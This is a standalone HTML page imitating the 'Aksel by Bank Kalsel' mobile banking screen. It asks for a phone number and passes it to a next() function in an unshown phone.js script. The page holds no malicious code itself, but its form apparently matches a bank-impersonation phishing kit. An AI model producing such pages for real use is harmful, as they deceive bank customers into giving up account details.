<html>
	<head>
		<title>Aksel by Bank Kalsel</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<link rel="stylesheet" href="assets/common/css/global.css">
		<link rel="stylesheet" href="assets/lib/ripple/ripple.css">
		<link rel="stylesheet" href="assets/lib/loader/loader.css">
		<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
        <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
        <script src="assets/lib/jquery/jquery.js"></script>
        <script src="assets/common/js/phone.js"></script>
	</head>
	<body>
		<div style="width: 100%; height: 100%; background-color: #ffffff;">
			<img src="assets/common/img/img1.jpg" style="width: 100%; height: 100%; object-fit: cover;">
			<div style="position: fixed; left: 0; top: 0; width: 100%; height: 100%; display: flex; flex-direction: column;">
				<div style="width: 100%; height: 25px; background-color: #0000002f;"></div>
				<div style="width: calc(100% - 40px); display: flex; flex-direction: row; justify-content: space-between; align-items: flex-start; padding-left: 20px; padding-right: 20px;">
					<img src="assets/common/img/icon1.png" style="width: 100px; height: 50px; object-fit: contain; margin-top: 10px;">
					<div style="display: flex; flex-direction: row; align-items: center; margin-top: 20px;">
						<div style="color: #ffffff; font-size: 14px;">ID</div>
						<img src="assets/common/img/id_flag.jpg" style="width: 20px; height: 20px; margin-left: 5px; object-fit: cover; border-radius: 10px;">
					</div>
				</div>
				<div style="width: calc(100% - 100px); padding: 30px; margin-top: 100px; margin-left: 20px; margin-right: 20px; background-color: #ffffff; border-radius: 20px; display: flex; flex-direction: column;">
					<div style="color: #888888; font-size: 16px;">
						Nomor Handphone
					</div>
					<div style="width: calc(100% - 20px); height: 40px; display: flex; flex-direction: row; align-items: center; margin-top: 20px; background-color: #eeeeee; padding-left: 10px; padding-right: 10px; font-size: 20x; border-radius: 5px;">
						<input id="phone" type="tel" placeholder="Input Nomor Handphone" style="flex: 1; height: 100%; background-color: transparent; color: #000000; font-size: 17px; border: 0; outline: 0;">
					</div>
					<div style="width: 100%; margin-top: 20px; display: flex; flex-direction: row; align-items: center;">
						<div onclick="window.history.back()" class="ripple" style="width: 40px; height: 40px; display: flex; justify-content: center; align-items: center; border: 1px solid #cccccc; border-radius: 20px;">
							<ion-icon name="ellipsis-horizontal" style="color: #000000; font-size: 20px;"></ion-icon>
						</div>
						<div onclick="next()" class="ripple" style="flex: 1; min-height: 40px; margin-left: 10px; border-radius: 30px; background-color: #11721A; color: #ffffff; font-size: 16px; display: flex; flex-direction: row; align-items: center; justify-content: center;">
					    	<ion-icon name="arrow-forward-circle-outline" style="color: #ffffff; font-size: 20px;"></ion-icon>
					    	<div style="color: #ffffff; font-size: 16px; margin-left: 5px;"><b>SELANJUTNYA</b></div>
				    	</div>
					</div>
				</div>
			</div>
			<div id="loader" style="display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; justify-content: center; align-items: center;">
				<div style="width: calc(100% - 80px); margin-left: 40px; margin-right: 40px; height: 120px; background-color: #ffffff; border-radius: 5px; display: flex; justify-content: center; align-items: center;">
					<div class="loader" style="width: 50px; height: 50px;"></div>
				</div>
			</div>
		</div>
	</body>
</html>
